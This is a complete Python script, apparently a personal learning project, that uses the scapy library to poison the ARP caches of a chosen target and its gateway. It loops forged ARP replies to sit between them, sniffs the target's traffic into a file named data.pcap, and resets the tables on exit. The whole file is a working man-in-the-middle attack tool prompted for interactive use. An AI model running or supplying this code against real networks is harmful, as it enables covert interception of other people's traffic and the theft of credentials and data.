#!/usr/bin/python3

# Simple ARP packets spoofer made using 'scapy' module.
# This project was created only for learning and will not be developed any more.
# Author: D1N3SHh


from scapy.all import *
import time


def get_mac(address):
    responses = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=address), timeout=5, verbose=False)[0]
    for confirmed in responses:
        return confirmed[1].hwsrc


def reset_arp_tables(target_ip, target_mac, endpoint_ip, endpoint_mac):
    print("[*] Restoring ARP tables...")
    reset_target_packet = ARP(op=2, psrc=endpoint_ip, pdst=target_ip, hwsrc=endpoint_mac, hwdst="ff:ff:ff:ff:ff:ff")
    reset_endpoint_packet = ARP(op=2, psrc=target_ip, pdst=endpoint_ip, hwsrc=target_mac, hwdst="ff:ff:ff:ff:ff:ff")
    send(reset_target_packet, verbose=False)
    send(reset_endpoint_packet, verbose=False)


def spoof(target_ip, target_mac, endpoint_ip, endpoint_mac):
    print("[*] Starting spoofing...")
    poisoning = True

    target_packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=endpoint_ip)
    endpoint_packet = ARP(op=2, pdst=endpoint_ip, hwdst=endpoint_mac, psrc=target_ip)

    while poisoning:
        try:
            send(target_packet, verbose=False)
            send(endpoint_packet, verbose=False)
            
            data = sniff(filter=str("ip host " + target_ip))
            wrpcap("data.pcap", data)

            time.sleep(5)
        except KeyboardInterrupt:
            poisoning = False
            print("[*] Data has been saved in 'data.pcap' file.")


def main():
    target_ip = input("[$] Target ip: ")
    endpoint_ip = input("[$] Gateway ip: ")
    
    target_mac = get_mac(target_ip)
    endpoint_mac = get_mac(endpoint_ip)

    spoof(target_ip, target_mac, endpoint_ip, endpoint_mac)
    reset_arp_tables(target_ip, target_mac, endpoint_ip, endpoint_mac)


if __name__ == "__main__":
    main()